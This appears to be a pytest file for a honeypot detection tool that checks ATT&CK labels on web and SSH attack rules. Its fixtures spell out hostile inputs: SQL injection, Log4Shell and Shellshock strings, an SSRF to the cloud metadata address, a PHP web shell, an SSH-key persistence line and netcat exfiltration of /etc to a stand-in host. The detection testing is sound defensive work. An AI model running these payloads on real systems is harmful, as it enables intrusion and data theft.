"""Per-kind ATT&CK labels on R5, command categories on R8, and the union on R10."""

from __future__ import annotations

import pytest
from helpers import FIREFOX, finding_for, run, ssh_with_honeytoken, web


def _hit(finding, rule_id):
    return next(h for h in finding.hits if h.rule_id == rule_id)


R5_CASES = [
    ("/?q=1' OR '1'='1", {}, None, {"T1190"}),
    ("/?q=<script>alert(1)</script>", {}, None, {"T1190"}),
    ("/?f=../../etc/passwd", {}, None, {"T1190"}),
    ("/?x=${jndi:ldap://evil.example/a}", {}, None, {"T1190"}),
    ("/cgi-bin/x", {"user-agent": "() { :;}; echo hi"}, None, {"T1190"}),
    ("/?class.module.classLoader.resources.x=1", {}, None, {"T1190"}),
    ("/fetch?url=http://169.254.169.254/latest/", {}, None, {"T1190"}),
    ("/?c=1;cat%20/x", {}, None, {"T1059.004"}),
    ("/up", {}, "<?php system($_GET[1]); ?>", {"T1505.003"}),
    ("/up?f=../x", {}, "<?php x ?>", {"T1190", "T1505.003"}),
]


@pytest.mark.parametrize(("path", "headers", "body", "expected"), R5_CASES)
def test_r5_attack_ids_follow_matched_kinds(read_events, path, headers, body, expected):
    ip = "198.51.100.150"
    client = web(ip)
    headers = {"user-agent": FIREFOX, **headers}
    if body is None:
        client.get(path, headers=headers)
    else:
        client.post(path, content=body, headers=headers)
    hit = _hit(finding_for(run(read_events), ip, "web"), "R5")
    assert expected <= set(hit.attack)
    if expected == {"T1505.003"}:
        assert "T1190" not in hit.attack


R8_CASES = [
    (["wget http://example.test/x.sh"], "download", {"T1105"}),
    (["echo k >> ~/.ssh/authorized_keys"], "persistence_ssh_key", {"T1098.004"}),
    (["crontab -l", "wget http://e.test/x"], "persistence_cron", {"T1053.003"}),
    (["sudo -l", "wget http://e.test/x"], "privilege_escalation", {"T1548.003"}),
    (["find / -perm -4000", "wget http://e.test/x"], "privilege_escalation", {"T1548.003"}),
    (["ssh admin@10.0.0.9", "wget http://e.test/x"], "lateral_movement", {"T1021.004"}),
    (["nc 203.0.113.9 4444", "wget http://e.test/x"], "exfiltration", {"T1048"}),
    (["tar c /etc | base64 | nc 203.0.113.9 1", "wget x"], "exfiltration", {"T1048"}),
    (["./xmrig -o stratum+tcp://pool.test:3333", "wget x"], "crypto_mining", {"T1496"}),
    (["whoami", "id", "uname -a"], "discovery", {"T1082", "T1033"}),
]


@pytest.mark.parametrize(("commands", "category", "expected"), R8_CASES)
def test_r8_categories_and_ids(read_events, commands, category, expected):
    ip = "198.51.100.151"
    ssh_with_honeytoken(ip, commands)
    hit = _hit(finding_for(run(read_events), ip, "ssh"), "R8")
    assert category in hit.measured
    assert expected <= set(hit.attack)


def test_r8_scoring_unchanged_by_new_categories(read_events):
    ssh_with_honeytoken("198.51.100.152", ["sudo -l", "ssh a@b"])  # labels only: no R8 hit
    ssh_with_honeytoken("198.51.100.153", ["whoami", "id"])
    result = run(read_events)
    for ip in ("198.51.100.152", "198.51.100.153"):
        assert "R8" not in {h.rule_id for h in finding_for(result, ip, "ssh").hits}


def test_r10_carries_union_of_chained_ids(read_events):
    ip = "198.51.100.154"
    scanner = web(ip, agent="Nikto/2.5.0")
    scanner.get("/wp-login.php")
    scanner.get("/phpmyadmin/")
    for i in range(6):
        scanner.post("/login", data={"username": "ops", "password": f"guess-{i}"})
    scanner.get("/backup/config.bak")
    ssh_with_honeytoken(ip, ["whoami", "id", "ls", "wget http://e.test/x"])
    result = run(read_events)
    mine = [f for f in result.findings if f.session.src_ip == ip]
    ssh_finding = next(f for f in mine if f.session.service == "ssh")
    r10 = _hit(ssh_finding, "R10")
    expected = {i for h in ssh_finding.hits if h.family != "chain" for i in h.attack}
    assert {"T1595.002", "T1110.001", "T1552.001", "T1105"} <= set(r10.attack)
    assert expected <= set(r10.attack) or set(r10.attack) >= {"T1105"}
